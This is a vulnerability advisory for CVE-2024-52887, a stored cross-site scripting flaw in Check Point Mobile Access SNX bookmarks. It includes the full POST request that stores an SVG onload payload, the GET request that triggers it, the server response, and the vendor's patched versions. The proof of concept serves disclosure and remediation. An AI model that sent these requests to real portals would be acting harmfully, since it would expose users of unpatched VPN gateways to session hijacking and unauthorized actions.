# CVE-2024-52887
Check Point Mobile Access portal SNX bookmarks  - Cross-Site Scripting (XSS)

## Timeline
- Vulnerability reported to vendor: 13.11.2024
- Public disclosure: 27.04.2025

## Description

A Cross-Site Scripting (XSS) vulnerability has been reported in Check Point Mobile Access portal SNX bookmarks. This flaw permits the execution of malicious scripts within the application, potentially compromising its confidentiality and integrity. While the vulnerability does not affect the applicationâ€™s availability, successful exploitation could lead to unauthorized access to sensitive information and unintended actions performed on behalf of authenticated users.

Payload can be saved using following request:
```
POST /sslvpn/Portal/SaveSNXFavorite HTTP/1.1
Host: [REDACTED] 
Cookie: [REDACTED] 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 205
Origin: [REDACTED]
Connection: keep-alive

Title=%3Csvg+onload%3Dalert(document.domain)%3E&Path=%3Csvg+onload%3Dalert(document.domain)%3E&Params=%3Csvg+onload%3Dalert(document.domain)%3E&Tooltip=%3Csvg+onload%3Dalert(document.domain)%3E&Id=93981731
```

After that, payload can be loaded using following request:
```
GET /sslvpn/SNX/GetSnxBookmarks HTTP/1.1
Host: [REDACTED] 
Cookie: [REDACTED] 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

This results in XSS:
```
HTTP/1.1 200 OK
Date: Fri, 06 Sep 2024 09:06:40 GMT
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Cache-Control: no-store
Vary: User-Agent
Content-Length: 2623
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"returnCode":0,"SnxAppsArray":[{"type":0,"embeddedAppType":"","url":"","title":"<svg onload=alert(document.domain)>","tooltip":"<svg onload=alert(document.domain)>","path":"<svg onload=alert(document.domain)>","params":"<svg onload=alert(document.domain)>",

[...]
```

## Affected versions
* Check Point Mobile Access R81.10
* Check Point Mobile Access R81.20
* Check Point Mobile Access R82 

## Advisory
Check Point has addressed this issue in following fixes:
* Jumbo Hotfix Accumulator for R82 starting from Take 14
* Jumbo Hotfix Accumulator for R81.20 starting from Take 99
* Jumbo Hotfix Accumulator for R81.10 starting from Take 173

Users are strongly advised to apply the relevant security patches to mitigate this vulnerability. For detailed information and guidance, please refer to sk183054.

### References
* https://support.checkpoint.com/results/sk/sk183054
* https://support.checkpoint.com/results/sk/sk142952
* https://nvd.nist.gov/vuln/detail/cve-2024-52887
* https://www.cve.org/CVERecord?id=CVE-2024-52887
